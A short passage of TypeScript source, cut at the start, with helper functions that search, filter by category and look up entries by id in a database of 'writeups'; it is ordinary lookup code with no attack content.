    w.tags.some(t => t.toLowerCase().includes(q)) ||
    w.description.toLowerCase().includes(q)
  );
}

export function getWriteupsByCategory(category: WriteupCategory): Writeup[] {
  return WRITEUPS_DB.filter(w => w.category === category);
}

export function getWriteupById(id: string): Writeup | undefined {
  return WRITEUPS_DB.find(w => w.id === id);
}
